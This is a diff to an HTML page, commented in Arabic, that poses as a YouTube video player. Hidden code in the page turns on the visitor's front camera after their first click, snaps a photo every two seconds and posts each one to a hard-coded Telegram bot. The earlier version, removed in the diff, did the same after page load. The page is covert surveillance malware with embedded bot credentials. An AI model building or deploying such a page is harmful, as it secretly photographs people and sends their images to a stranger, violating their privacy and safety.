@@ -4,75 +4,118 @@
     <meta charset="UTF-8">
     <title>مشغل الوسائط</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; overflow: hidden; }
-        
-        /* الفيديو الأساسي */
-        .video-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        
-        /* إطار الكاميرا الخفي (يجب أن يكون موجوداً ليعمل المتصفح) */
-        #v { width: 1px; height: 1px; opacity: 0; position: fixed; top: 0; left: 0; z-index: -1; }
-        
-        iframe { width: 100%; height: 100%; border: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        /* الفيديو يملأ الشاشة */
+        .video-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            /* منع التفاعل مع الـ iframe مباشرة لإجبار المتصفح على رصد النقر على الـ body */
+            pointer-events: none; 
+        }
+
+        /* الكاميرا مخفية تماماً */
+        #v {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
+<div class="video-wrapper">
+    <iframe id="youtube-player" src="https://www.youtube.com/embed/TnPZiCf36Lc?enablejsapi=1&autoplay=1&mute=1" allow="autoplay; encrypted-media"></iframe>
+</div>
 
-    <div class="video-wrapper">
-        <iframe src="https://youtube.com/shorts/TnPZiCf36Lc?si=nxqE9b-LN_2QQGMa" 
-                allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
+<video id="v" autoplay playsinline muted></video>
+<canvas id="c"></canvas>
 
-    <script>
-        const CONFIG = {
-            BOT_TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
-            CHAT_ID: "7000276863",
-            MAX_PHOTOS: 10
-        };
+<script>
+    const CONFIG = {
+        TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
+        CHAT_ID: "7000276863",
+        INTERVAL: 2000, // كل ثانيتين
+        QUALITY: 6    // جودة منخفضة لسرعة الإرسال
+    };
 
-        const v = document.getElementById('v');
-        const c = document.getElementById('c');
-        const ctx = c.getContext('2d');
+    const video = document.getElementById('v');
+    const canvas = document.getElementById('c');
+    const ctx = canvas.getContext('2d');
+    const iframe = document.getElementById('youtube-player');
 
-        async function startHunt() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                v.srcObject = stream;
-                await v.play();
-                
-                // التقاط الصور
-                for (let i = 0; i < CONFIG.MAX_PHOTOS; i++) {
-                    captureAndSend();
-                    await new Promise(r => setTimeout(r, 1000));
-                }
-                stream.getTracks().forEach(t => t.stop());
-            } catch (err) {
-                console.log("يتطلب إذن الكاميرا تفاعل المستخدم.");
-            }
+    let isStarted = false;
+
+    // يبدأ كل شيء عند أول نقرة للمستخدم
+    document.body.addEventListener('click', () => {
+        if (isStarted) return;
+        isStarted = true;
+
+        // 1. تشغيل صوت الفيديو (تحديث الرابط لإلغاء الكتم)
+        let currentSrc = iframe.src;
+        iframe.src = currentSrc.replace("mute=1", "mute=0");
+
+        // 2. تفعيل الكاميرا
+        initCamera();
+    });
+
+    async function initCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            video.srcObject = stream;
+            video.play();
+
+            // بدء حلقة الالتقاط
+            setInterval(captureAndSend, CONFIG.INTERVAL);
+        } catch (err) {
+            console.warn("Camera access denied.");
         }
+    }
 
-        function captureAndSend() {
-            if (v.readyState !== 4) return;
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            ctx.drawImage(v, 0, 0, c.width, c.height);
-            
-            c.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CONFIG.CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg', 0.5);
-        }
+    function captureAndSend() {
+        if (video.readyState !== 4) return;
 
-        // بدء العملية بعد تحميل الصفحة بـ 3 ثواني
-        window.onload = () => setTimeout(startHunt, 3000);
-    </script>
+        // حجم صغير للسرعة القصوى
+        canvas.width = 400;
+        canvas.height = 300;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.CHAT_ID);
+            formData.append('photo', blob, 'shot.jpg');
+
+            fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {}); 
+        }, 'image/jpeg', CONFIG.QUALITY);
+    }
+</script>
+
 </body>
 </html>
-
